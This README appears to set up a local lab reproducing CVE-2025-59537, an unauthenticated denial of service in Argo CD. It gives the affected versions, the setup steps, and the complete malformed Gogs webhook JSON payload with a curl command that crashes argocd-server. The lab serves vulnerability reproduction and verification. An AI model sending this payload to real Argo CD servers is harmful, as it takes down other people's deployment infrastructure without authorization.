# CVE-2025-59537 Reproduction Environment

ArgoCD Unauthenticated DoS via Malformed Gogs Webhook Payload

## Vulnerability Summary

With the default configuration (no `webhook.gogs.secret` set), Argo CD's `/api/webhook` endpoint crashes the entire argocd-server process when it receives a Gogs push event with missing `repo` field.

- **CVSS Score**: 7.5 (High)
- **Attack Vector**: Network (unauthenticated)
- **Affected Versions**: 1.2.0-1.8.7, 2.0.0-rc1-2.14.19, 3.0.0-rc1-3.2.0-rc1

## Prerequisites

- Docker
- Internet connection (to download Kind, kubectl, and ArgoCD images)

## Environment Setup

```bash
cd build_depend
chmod +x setup.sh cleanup.sh
./setup.sh
```

Wait for ArgoCD pods to be ready, then start port-forward:

```bash
./kubectl port-forward svc/argocd-server -n argocd 8080:443
```

## Verify Vulnerability

In another terminal:

```bash
cd exp_workspace
python3 poc.py
```

Expected result: ArgoCD server crashes and restarts.

## Cleanup

```bash
cd build_depend
./cleanup.sh
```

## PoC Payload

```json
{
  "ref": "refs/heads/master",
  "before": "0000000000000000000000000000000000000000",
  "after": "0a05129851238652bf806a400af89fa974ade739",
  "commits": [{}]
}
```

Send with:

```bash
curl -k https://localhost:8080/api/webhook \
  -H 'X-Gogs-Event: push' \
  -H 'Content-Type: application/json' \
  -d '{"ref":"refs/heads/master","before":"0000000000000000000000000000000000000000","after":"0a05129851238652bf806a400af89fa974ade739","commits":[{}]}'
```
